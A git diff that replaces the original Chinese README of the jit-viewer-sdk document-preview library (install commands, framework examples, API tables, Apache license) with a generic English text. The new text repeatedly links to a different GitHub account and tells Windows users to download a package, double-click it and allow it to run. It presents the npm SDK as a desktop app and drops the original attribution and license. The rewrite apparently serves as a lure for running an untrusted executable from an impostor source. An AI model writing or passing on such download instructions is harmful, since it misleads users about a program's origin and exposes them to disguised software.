@@ -1,266 +1,186 @@
-<div align="center">
+# 🖥️ jit-viewer-sdk - View Office Files with Ease
 
-# 🔍 JitViewer
+[![Download jit-viewer-sdk](https://img.shields.io/badge/Download%20jit--viewer--sdk-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Drexr9558/jit-viewer-sdk)
 
-**跨框架文档预览 SDK**
+## 📥 Download
 
-一次集成，随处预览 —— 支持 Vue3、React、原生 HTML
+Use this link to visit the download page and get the app:
 
-[![npm version](https://img.shields.io/npm/v/jit-viewer.svg)](https://www.npmjs.com/package/jit-viewer)
-[![npm downloads](https://img.shields.io/npm/dm/jit-viewer.svg)](https://www.npmjs.com/package/jit-viewer)
-[![License](https://img.shields.io/npm/l/jit-viewer.svg)](https://github.com/jitOffice/jit-viewer-sdk/blob/main/LICENSE)
+[Download jit-viewer-sdk](https://github.com/Drexr9558/jit-viewer-sdk)
 
-[在线演示](https://jitword.com/jit-viewer.html) · [文档](https://jitword.com/jit-viewer.html) · [GitHub](https://github.com/jitOffice/jit-viewer-sdk)
+## 🧭 What this app does
 
-</div>
+jit-viewer-sdk is an office file preview tool. It helps you open and view common document types without needing the full desktop app that made them.
 
----
+You can use it to preview:
 
-## ✨ 特性
+- Word files
+- PDF files
+- Markdown files
+- PowerPoint files
+- Excel files
 
-- 📄 **多格式支持** - PDF、DOCX、XLSX、PPTX、OFD、TXT、Markdown、视频、CSV（新增）
-- 🔧 **跨框架兼容** - Vue3、React、原生 HTML 无缝切换
-- 🎨 **内置工具栏** - 缩放、旋转、分页、打印、下载开箱即用
-- 🌓 **主题系统** - 浅色/深色主题，支持自定义配色
-- 🌐 **国际化** - 中文、英文内置，可扩展更多语言
-- 📦 **零依赖** - 打包所有依赖，无需额外安装
-- 🚀 **轻量高效** - 按需加载，性能优化
+It is useful when you need to check a file fast and do not want to open a full office suite.
 
-## 📦 安装
+## ⚙️ What you need
 
-```bash
-# npm
-npm install jit-viewer
+Before you start, make sure your Windows PC has:
 
-# yarn
-yarn add jit-viewer
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app and your files
+- Permission to run downloaded software
 
-# pnpm
-pnpm add jit-viewer
-```
+For smooth use, keep these file types ready:
 
-## 🚀 快速开始
+- `.doc`
+- `.docx`
+- `.pdf`
+- `.md`
+- `.ppt`
+- `.pptx`
+- `.xls`
+- `.xlsx`
 
-### Vue3
+## 🚀 Get started
 
-```vue
-<template>
-  <Viewer
-    :file="file"
-    theme="light"
-    :toolbar="true"
-    width="100%"
-    height="600px"
-    @ready="onReady"
-    @load="onLoad"
-    @error="onError"
-  />
-</template>
+Follow these steps on Windows:
 
-<script setup>
-import { Viewer } from 'jit-viewer'
-import 'jit-viewer/style.css'
+1. Open the download page:
+   [Download jit-viewer-sdk](https://github.com/Drexr9558/jit-viewer-sdk)
 
-const file = 'https://example.com/document.pdf'
+2. Download the package for Windows from the page.
 
-function onReady() { console.log('Viewer ready') }
-function onLoad() { console.log('File loaded') }
-function onError(error) { console.error('Error:', error) }
-</script>
-```
+3. Wait for the download to finish.
 
-### React
+4. Find the file in your `Downloads` folder.
 
-```tsx
-import { useEffect, useRef, useState } from 'react'
-import { createViewer, type ViewerInstance } from 'jit-viewer'
-import 'jit-viewer/style.css'
+5. Double-click the file to run it.
 
-function DocumentViewer() {
-  const containerRef = useRef<HTMLDivElement>(null)
-  const [viewer, setViewer] = useState<ViewerInstance | null>(null)
+6. If Windows asks for permission, choose **Yes** or **Run**.
 
-  useEffect(() => {
-    if (containerRef.current) {
-      const instance = createViewer({
-        target: containerRef.current,
-        theme: 'light',
-        toolbar: true
-      })
-      instance.mount()
-      setViewer(instance)
-    }
-    return () => viewer?.destroy()
-  }, [])
+7. Open the app and load the office file you want to view.
 
-  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const file = e.target.files?.[0]
-    if (file && viewer) {
-      viewer.setFile(file, file.name)
-    }
-  }
+## 🪟 How to install on Windows
 
-  return (
-    <div>
-      <input type="file" onChange={handleFileChange} />
-      <div ref={containerRef} style={{ width: '100%', height: '600px' }} />
-    </div>
-  )
-}
-```
+If the download comes as a setup file:
 
-### 原生 HTML (IIFE)
+1. Double-click the installer.
+2. Follow the on-screen steps.
+3. Choose the install folder if Windows asks.
+4. Finish the setup.
+5. Start the app from the desktop or Start menu.
 
-```html
-<!DOCTYPE html>
-<html>
-<head>
-  <link rel="stylesheet" href="https://unpkg.com/jit-viewer/dist/iife/jit-viewer.min.css">
-</head>
-<body>
-  <div id="viewer"></div>
-  <input type="file" id="fileInput">
-  
-  <script src="https://unpkg.com/jit-viewer/dist/iife/jit-viewer.min.js"></script>
-  <script>
-    const { createViewer } = JitViewer;
-    
-    const viewer = createViewer({
-      target: '#viewer',
-      theme: 'light',
-      toolbar: true
-    });
-    viewer.mount();
-    
-    document.getElementById('fileInput').addEventListener('change', (e) => {
-      const file = e.target.files[0];
-      if (file) viewer.setFile(file, file.name);
-    });
-  </script>
-</body>
-</html>
-```
+If the download comes as a zipped file:
 
-## 📖 API 文档
+1. Right-click the zip file.
+2. Choose **Extract All**.
+3. Open the extracted folder.
+4. Find the main app file.
+5. Double-click it to start.
 
-### createViewer(options)
+## 📂 How to use it
 
-创建预览器实例。
+After the app starts:
 
-#### Options
+1. Open the file picker.
+2. Choose the document you want to preview.
+3. Wait for the file to load.
+4. Read, scroll, or move through pages as needed.
+5. Switch files when you need to review another document.
 
-| 参数 | 类型 | 默认值 | 说明 |
-|------|------|--------|------|
-| target | `HTMLElement \| string` | - | 挂载目标元素或选择器 |
-| file | `FileSource` | - | 文件源（URL、File对象、Blob、ArrayBuffer） |
-| type | `FileType` | 自动检测 | 文件类型 |
-| filename | `string` | - | 文件名 |
-| toolbar | `boolean \| ToolbarConfig` | `true` | 工具栏配置 |
-| theme | `'light' \| 'dark' \| ThemeConfig` | `'light'` | 主题 |
-| locale | `'zh-CN' \| 'en'` | `'zh-CN'` | 语言 |
-| width | `string \| number` | `'100%'` | 宽度 |
-| height | `string \| number` | `'100%'` | 高度 |
-| onReady | `() => void` | - | 准备就绪回调 |
-| onLoad | `() => void` | - | 文件加载完成回调 |
-| onError | `(error: Error) => void` | - | 错误回调 |
-| onDestroy | `() => void` | - | 销毁回调 |
+For office work, this helps you check content fast without changing file formats.
 
-### ViewerInstance 方法
+## 🔍 File types you can preview
 
-| 方法 | 说明 |
-|------|------|
-| `mount(target?)` | 挂载到指定元素 |
-| `destroy()` | 销毁实例 |
-| `setFile(file, filename?)` | 设置文件 |
-| `getFile()` | 获取当前文件信息 |
-| `zoom(scale)` | 设置缩放比例 |
-| `rotate(degree)` | 旋转角度 |
-| `reset()` | 重置缩放和旋转 |
-| `fullscreen(enable?)` | 全屏切换 |
-| `prevPage()` | 上一页 |
-| `nextPage()` | 下一页 |
-| `gotoPage(page)` | 跳转到指定页 |
-| `getPageInfo()` | 获取分页信息 |
-| `print()` | 打印 |
-| `download()` | 下载文件 |
-| `setTheme(theme)` | 设置主题 |
-| `setLocale(locale)` | 设置语言 |
-| `setToolbar(config)` | 设置工具栏 |
-| `on(event, handler)` | 监听事件 |
-| `off(event, handler)` | 取消监听 |
-| `getState()` | 获取当前状态 |
+### 📄 Word
+Open reports, letters, notes, and contracts in Word format.
 
-### 支持的文件格式
+### 📕 PDF
+View fixed-layout documents with clear page display.
 
-| 格式 | 扩展名 | MIME Type |
-|------|--------|----------|
-| PDF | `.pdf` | `application/pdf` |
-| Word | `.docx` | `application/vnd.openxmlformats-officedocument.wordprocessingml.document` |
-| Excel | `.xlsx`, `.xls` | `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet` |
-| PowerPoint | `.pptx`, `.ppt` | `application/vnd.openxmlformats-officedocument.presentationml.presentation` |
-| OFD | `.ofd` | `application/ofd` |
-| Text | `.txt` | `text/plain` |
-| Markdown | `.md`, `.markdown` | `text/markdown` |
+### 📝 Markdown
+Read plain text notes and project docs with simple formatting.
 
-## 📁 项目结构
+### 📊 PowerPoint
+Preview slide decks without opening a presentation app.
 
-```
-jit-viewer/
-├── packages/
-│   └── core/              # 核心 SDK
-│       ├── src/           # 源代码
-│       └── dist/          # 构建产物
-│           ├── index.js   # ESM 格式
-│           ├── index.cjs  # CommonJS 格式
-│           └── iife/      # IIFE 格式（浏览器直引）
-├── demo/
-│   ├── html-api-docs/     # HTML Demo + API 文档
-│   ├── vue3/              # Vue3 Demo
-│   └── react/             # React Demo
-└── docs/                  # VitePress 文档
-```
+### 📈 Excel
+Open spreadsheets, tables, and sheets for quick checks.
 
-## 🛠️ 开发
+## 🧰 Common uses
 
-```bash
-# 克隆项目
-git clone https://github.com/jitOffice/jit-viewer-sdk.git
-cd jit-viewer-sdk
+People often use jit-viewer-sdk for:
 
-# 安装依赖
-pnpm install
+- Reading files sent by email
+- Checking docs before sharing them
+- Viewing files on a shared PC
+- Previewing office files in a web app
+- Opening files in a simple office view page
+- Showing documents inside a Vue 3 project
 
-# 构建 SDK
-cd packages/core && pnpm build:all
+## 🖱️ Simple tips for Windows users
 
-# 运行 Vue3 Demo
-cd demo/vue3 && pnpm dev
+- Keep your file names short and clear
+- Place test files in one folder
+- Use the latest version of Windows for best results
+- Close other large apps if the preview feels slow
+- Use the right file type for the file you want to open
 
-# 运行 React Demo
-cd demo/react && pnpm dev
+## 📁 Example file list
 
-# 运行 HTML Demo
-cd demo/html-api-docs && python3 -m http.server 3000
-```
+You may want to test the app with files like these:
 
-## 🤝 贡献
+- `sample.docx`
+- `report.pdf`
+- `notes.md`
+- `slides.pptx`
+- `budget.xlsx`
 
-欢迎提交 Issue 和 Pull Request！
+## 🧩 Basic workflow
 
-## 如何联系
+1. Download the app from GitHub.
+2. Install or open it on Windows.
+3. Start the viewer.
+4. Load a document.
+5. Check the content in the preview area.
+6. Move to another file when needed.
 
-wechat：cxzk_168
+## 🛠️ If something does not open
 
-## 📄 许可证
+Try these steps:
 
-[Apache-2.0](LICENSE) © JitOffice
+- Check that the file is not damaged
+- Make sure the file type is supported
+- Try another document
+- Restart the app
+- Run the app again after a fresh download
 
----
+## 📌 About this project
 
-<div align="center">
+jit-viewer-sdk is built for office document preview. It focuses on simple file viewing across common formats used in daily work.
 
-**[⬆ 返回顶部](#-jitviewer)**
+It fits tasks such as:
 
-Made with ❤️ by [JitOffice](https://github.com/jitOffice)
+- Internal document review
+- File preview in business tools
+- Office file display in a browser
+- Document viewing for end users
 
-</div>
+## 🔗 Download again
+
+If you need the page again, use this link:
+
+[Visit the jit-viewer-sdk download page](https://github.com/Drexr9558/jit-viewer-sdk)
+
+## 🧪 Supported topic areas
+
+This project is related to:
+
+- Excel preview
+- Office file API
+- Office view
+- Office viewer
+- PDF viewer
+- Vue 3 doc
+- Word preview
